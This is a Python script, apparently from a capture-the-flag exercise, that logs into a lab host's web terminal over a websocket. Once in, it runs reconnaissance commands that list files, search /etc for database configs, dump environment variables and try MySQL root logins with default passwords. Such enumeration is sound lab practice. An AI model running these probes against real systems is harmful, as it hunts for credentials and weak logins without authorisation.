import time
import websocket

URL='ws://oj-10-30-15-9-46057.adworld.xctf.org.cn/ws'
ORIGIN='http://oj-10-30-15-9-46057.adworld.xctf.org.cn'
PROMPT=':~$ '

def connect(retries=10, delay=2):
    last=None
    for i in range(retries):
        try:
            return websocket.create_connection(URL, subprotocols=['tty'], timeout=10, origin=ORIGIN)
        except Exception as e:
            last=e
            print(f'connect_retry_{i+1}: {type(e).__name__}: {e}')
            time.sleep(delay)
    raise last

def recv_until(ws, markers, timeout=20):
    end=time.time()+timeout
    buf=''
    while time.time()<end:
        ws.settimeout(max(0.5,min(2.0,end-time.time())))
        try:
            data=ws.recv()
        except Exception:
            continue
        if isinstance(data,(bytes,bytearray)):
            data=data.decode('utf-8','ignore')
        if not data:
            continue
        buf += data[1:] if data[0]=='0' else f'\n[[CTRL:{data!r}]]\n'
        if any(m in buf for m in markers):
            break
    return buf

def run(ws, cmd, timeout=20):
    ws.send('0'+cmd+'\n')
    out=recv_until(ws,[PROMPT],timeout)
    print(f'===== {cmd!r} =====')
    print(out)
    print('===== END =====\n')
    return out

ws=connect()
ws.send('{"columns":180,"rows":50}')
print(recv_until(ws,['login:'],5))
run(ws,'ctf',8)
run(ws,'ctf',15)
cmds=[
    'ls -la /home/ctf',
    'find /home/ctf -maxdepth 3 -type f | sort',
    'find /var/www -maxdepth 3 -type f 2>/dev/null | sort',
    'find /etc -maxdepth 2 -type f | grep -Ei "mysql|maria|my.cnf|db|sql|php|conf" | sort | head -200',
    'env | sort',
    'mysql -uroot -e "show databases;"',
    'mysql -uroot -proot -e "show databases;"',
    'mysql -uroot --protocol=socket -e "show databases;"',
    'mysql -e "show databases;"',
]
for c in cmds:
    run(ws,c,25)
ws.close()
